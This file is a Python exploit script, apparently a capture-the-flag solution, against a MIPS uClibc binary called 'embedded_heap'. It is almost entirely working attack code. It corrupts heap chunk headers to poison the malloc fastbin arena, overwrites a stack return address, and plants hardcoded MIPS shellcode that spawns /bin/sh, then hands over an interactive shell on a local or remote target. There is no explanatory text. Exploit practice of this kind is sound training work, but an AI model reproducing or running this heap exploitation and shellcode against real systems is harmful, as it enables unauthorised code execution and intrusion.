#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file    = './embedded_heap'
libc_file   = './lib/libuClibc-0.9.33.2.so'

context(os = 'linux', arch = 'mips', endian = 'big')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'PROC', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':('qemu-mips-static -g 1234 -L . {}'.format(bin_file)).split(), 'aslr':False}, \
                        local   = {'argv':('qemu-mips-static -L . {}'.format(bin_file)).split()}, \
                        remote  = {'host':'target', 'port':4296})
env.select()

#==========

binf = ELF(bin_file)
addr_stack_ret              = 0x7ffeb9b4
'''
binf.address                = 0x7ffed000
addr_heap_base              = 0x7f669000
'''

libc = ELF(libc_file)
libc.address                = 0x7f76a000
offset_libc_malloc_state    = libc.symbols['__malloc_state']
offset_libc_arena_fast0     = offset_libc_malloc_state - 4

#==========

def attack(conn, **kwargs):
    eh = EmbeddedHeap(conn)

    eh.update(0, '0'*(eh.size[0]-4) + p32(8 | 1))
    eh.update(2, '2'*(eh.size[2]-4) + p32(u(p((addr_stack_ret - offset_libc_arena_fast0)/4*8 | 1))))

    shellasm = shellcraft.sh()
    # shellcode = asm(shellasm)
    shellcode = "\x3c\x09\x2f\x2f\x35\x29\x62\x69\xaf\xa9\xff\xf4\x3c\x09\x6e\x2f\x35\x29\x73\x68\xaf\xa9\xff\xf8\xaf\xa0\xff\xfc\x27\xbd\xff\xf4\x03\xa0\x20\x20\xaf\xa0\xff\xfc\x27\xbd\xff\xfc\x34\x06\xff\xff\x00\xc0\x30\x2a\xaf\xa6\xff\xfc\x23\xbd\xff\xfc\x03\xa0\x30\x20\x3c\x19\x8c\x97\x37\x39\xff\xff\x03\x20\x48\x27\xaf\xa9\xff\xfc\x27\xbd\xff\xfc\x34\x05\xff\xff\x00\xa0\x28\x2a\xaf\xa5\xff\xfc\x23\xbd\xff\xfc\x24\x19\xff\xfb\x03\x20\x28\x27\x00\xbd\x28\x20\xaf\xa5\xff\xfc\x23\xbd\xff\xfc\x03\xa0\x28\x20\x34\x02\x0f\xab\x01\x01\x01\x0c"
    eh.pwn([1, 3], 2, '2'*(eh.size[2]-8) + shellcode)

    '''
    eh.update(0, ''.ljust(eh.size[0]-4, '0') + p32((eh.size[1]+8) | 1))

    fake_chunk  = p32(0)
    fake_chunk += p32((eh.size[2]-8) | 1)
    fake_chunk += p32((addr_list+0xc*3 - 4) - 0xc)
    fake_chunk += p32((addr_list+0xc*3 - 4) - 0x8)
    eh.update(2, fake_chunk.ljust(eh.size[2]-8, '1')+p32(eh.size[2]-8)+p32(sum(eh.size[3:])))

    '''

class EmbeddedHeap:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

        self.recvuntil('=\n')
        self.size = map(lambda x : (int(x.split()[1])+4 + 0x7) & ~0x7, self.recvuntil('\n1', drop=True).split('\n'))
        print self.size

    def update(self, idx, content):
        self.sendlineafter('Command: ', '1')
        self.sendlineafter('Index: ', str(idx))
        self.sendlineafter('Size: ', str(len(content)))
        self.sendafter('Content: ', content)

    def view(self, idx):
        self.sendlineafter('Command: ', '2')
        self.sendlineafter('Index: ', str(idx))
        self.recvuntil(']: ')
        return self.recvuntil('\n1', drop=True)

    def pwn(self, free_idx, update_idx, content):
        self.sendlineafter('Command: ', '3')
        self.sendlineafter('Index: ', str(free_idx[0]))
        self.sendlineafter('Index: ', str(free_idx[1]))
        self.sendlineafter('Index: ', str(update_idx))
        self.sendlineafter('Size: ', str(len(content)))
        self.sendafter('Content: ', content)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()

#==========
